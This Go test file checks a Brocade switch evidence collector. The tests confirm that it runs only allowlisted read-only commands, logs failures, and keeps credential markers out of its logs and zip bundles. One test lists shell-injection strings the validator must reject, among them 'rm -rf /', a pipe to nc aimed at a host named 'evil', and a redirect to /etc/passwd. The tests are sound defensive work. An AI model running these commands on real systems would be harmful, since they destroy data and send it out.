package brocadecli

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/json"
	"io"
	"strings"
	"testing"
	"time"

	"github.com/forgeai/connector-agent/evidencebundle"
)

// fakeRunner is a test CommandRunner. It never touches the network. It records
// every exec it was asked to run and returns canned Brocade-ish output, with an
// optional set of commands forced to fail.
type fakeRunner struct {
	execs       []string        // every exec string seen (allowlist assertion)
	failExecs   map[string]bool // exec substrings forced to fail
	timeoutExec string          // exec substring forced to time out
	emptyExec   string          // exec substring forced to return empty stdout
}

func (f *fakeRunner) Run(_ context.Context, target BrocadeTarget, exec string) CommandResult {
	f.execs = append(f.execs, exec)
	res := CommandResult{Started: time.Unix(0, 0).UTC(), Elapsed: time.Millisecond}

	if f.timeoutExec != "" && strings.Contains(exec, f.timeoutExec) {
		res.TimedOut = true
		res.ExitCode = -1
		res.Stderr = []byte("timed out")
		return res
	}
	if f.emptyExec != "" && strings.Contains(exec, f.emptyExec) {
		res.ExitCode = 0
		res.Stdout = []byte("   \n")
		return res
	}
	for sub := range f.failExecs {
		if strings.Contains(exec, sub) {
			res.ExitCode = 1
			res.Stderr = []byte("command not supported on this platform")
			return res
		}
	}
	res.ExitCode = 0
	res.Stdout = []byte("=== " + target.SwitchName + " " + exec + " ===\nsample read-only output line\n")
	return res
}

func twoTargets() []BrocadeTarget {
	fidA := 128
	return []BrocadeTarget{
		{SwitchName: "DCX6-PROD-A", Host: "10.10.10.21", Username: "svc_SECRET_user", FabricRole: "source", FID: &fidA, SSHKeyPath: "/keys/id_rsa_SENTINEL", Notes: "Prod fabric A"},
		{SwitchName: "DCX6-PROD-B", Host: "10.10.10.22", Username: "svc_SECRET_user", FabricRole: "source", FID: &fidA, SSHKeyPath: "/keys/id_rsa_SENTINEL", Notes: "Prod fabric A"},
	}
}

func manifestFromZip(t *testing.T, zipBytes []byte) evidencebundle.Manifest {
	t.Helper()
	zr, err := zip.NewReader(bytes.NewReader(zipBytes), int64(len(zipBytes)))
	if err != nil {
		t.Fatalf("open zip: %v", err)
	}
	for _, f := range zr.File {
		if strings.HasSuffix(f.Name, "manifest.json") {
			rc, err := f.Open()
			if err != nil {
				t.Fatalf("open manifest: %v", err)
			}
			defer rc.Close()
			data, _ := io.ReadAll(rc)
			var m evidencebundle.Manifest
			if err := json.Unmarshal(data, &m); err != nil {
				t.Fatalf("parse manifest: %v", err)
			}
			return m
		}
	}
	t.Fatal("manifest.json not found in zip")
	return evidencebundle.Manifest{}
}

// Test 1: happy path — capture across two switches produces a valid bundle.
func TestCollectBundle_AllCommandsSucceed(t *testing.T) {
	runner := &fakeRunner{}
	res, log, err := CollectBundle(context.Background(), runner, twoTargets(), CollectOptions{
		CollectedAt: time.Unix(1_700_000_000, 0).UTC(),
	})
	if err != nil {
		t.Fatalf("CollectBundle: %v", err)
	}

	profile, err := evidencebundle.ProfileCommands()
	if err != nil {
		t.Fatalf("profile: %v", err)
	}

	m := manifestFromZip(t, res.Zip)
	if m.CollectionMethod != "agent" {
		t.Fatalf("collection_method = %q, want agent", m.CollectionMethod)
	}
	if len(m.Switches) != 2 {
		t.Fatalf("switches = %d, want 2", len(m.Switches))
	}
	for _, sw := range m.Switches {
		if len(sw.Files) != len(profile) {
			t.Fatalf("switch %s files = %d, want %d", sw.SwitchName, len(sw.Files), len(profile))
		}
		if sw.FID == nil || *sw.FID != 128 {
			t.Fatalf("switch %s FID not recorded as metadata", sw.SwitchName)
		}
	}
	if res.Summary.CommandsFailed != 0 {
		t.Fatalf("CommandsFailed = %d, want 0", res.Summary.CommandsFailed)
	}
	// Every log entry included.
	for _, e := range log.Entries {
		if !e.Included {
			t.Fatalf("expected all commands included, %s excluded", e.CommandID)
		}
	}
}

// Test 2: failed commands are logged but excluded from manifest files.
func TestCollectBundle_FailedCommandsExcludedButLogged(t *testing.T) {
	runner := &fakeRunner{
		failExecs:   map[string]bool{"errdump": true},
		timeoutExec: "sfpshow -all",
	}
	res, log, err := CollectBundle(context.Background(), runner, twoTargets(), CollectOptions{
		CollectedAt: time.Unix(1_700_000_000, 0).UTC(),
	})
	if err != nil {
		t.Fatalf("CollectBundle (continue-on-error default): %v", err)
	}

	m := manifestFromZip(t, res.Zip)
	for _, sw := range m.Switches {
		for _, f := range sw.Files {
			if f.Command == "errdump" || f.Command == "sfpshow -all" {
				t.Fatalf("failed command %q must not appear in manifest files", f.Command)
			}
		}
	}

	// Failures present in the log, marked excluded.
	sawErr, sawTimeout := false, false
	for _, e := range log.Entries {
		if e.CommandID == "errdump" {
			sawErr = true
			if e.Included {
				t.Fatalf("errdump should be excluded")
			}
		}
		if e.CommandID == "sfpshow -all" {
			sawTimeout = true
			if !e.TimedOut || e.Included {
				t.Fatalf("sfpshow -all should be timed-out and excluded")
			}
		}
	}
	if !sawErr || !sawTimeout {
		t.Fatalf("expected both failed commands in the log (err=%v timeout=%v)", sawErr, sawTimeout)
	}
	if res.Summary.CommandsFailed == 0 {
		t.Fatalf("CommandsFailed should be > 0")
	}
}

// ContinueOnError=false makes the first failure fatal.
func TestCollect_StopOnError(t *testing.T) {
	runner := &fakeRunner{failExecs: map[string]bool{"errdump": true}}
	_, _, err := Collect(context.Background(), runner, twoTargets(), CollectOptions{
		ContinueOnError: BoolPtr(false),
	})
	if err == nil {
		t.Fatal("expected error when ContinueOnError=false and a command fails")
	}
}

// Test 3a: the collector runs EXACTLY the embedded profile's commands — no more,
// no less — proving there is no arbitrary-command execution path.
func TestCollect_RunsOnlyProfileCommands(t *testing.T) {
	runner := &fakeRunner{}
	targets := twoTargets()[:1]
	if _, _, err := Collect(context.Background(), runner, targets, CollectOptions{}); err != nil {
		t.Fatalf("Collect: %v", err)
	}

	profile, err := evidencebundle.ProfileCommands()
	if err != nil {
		t.Fatalf("profile: %v", err)
	}
	want := map[string]bool{}
	portRange := evidencebundle.DefaultPortRange()
	for _, pc := range profile {
		want[strings.ReplaceAll(pc.Exec, "{port_range}", portRange)] = true
	}
	if len(runner.execs) != len(profile) {
		t.Fatalf("ran %d commands, profile has %d", len(runner.execs), len(profile))
	}
	for _, e := range runner.execs {
		if !want[e] {
			t.Fatalf("collector ran a command not in the profile: %q", e)
		}
	}
}

// Test 3b: assertSafeExec rejects shell-control characters.
func TestAssertSafeExec(t *testing.T) {
	if err := assertSafeExec("switchshow"); err != nil {
		t.Fatalf("clean exec rejected: %v", err)
	}
	bad := []string{
		"switchshow; rm -rf /",
		"switchshow | nc evil 1",
		"switchshow && reboot",
		"echo $(whoami)",
		"switchshow > /etc/passwd",
		"switchshow`id`",
		"switchshow\nconfigure",
	}
	for _, b := range bad {
		if err := assertSafeExec(b); err == nil {
			t.Fatalf("expected rejection for %q", b)
		}
	}
}

// Test 4: no credentials (key path / username secret marker) leak into the log
// or the produced ZIP.
func TestCollectBundle_NoCredentialLeakage(t *testing.T) {
	runner := &fakeRunner{}
	res, log, err := CollectBundle(context.Background(), runner, twoTargets(), CollectOptions{
		CollectedAt: time.Unix(1_700_000_000, 0).UTC(),
	})
	if err != nil {
		t.Fatalf("CollectBundle: %v", err)
	}
	secrets := []string{"SENTINEL", "svc_SECRET_user", "/keys/id_rsa"}
	logText := log.String()
	for _, s := range secrets {
		if strings.Contains(logText, s) {
			t.Fatalf("collection log leaked secret marker %q", s)
		}
		if bytes.Contains(res.Zip, []byte(s)) {
			t.Fatalf("bundle ZIP leaked secret marker %q", s)
		}
	}
}
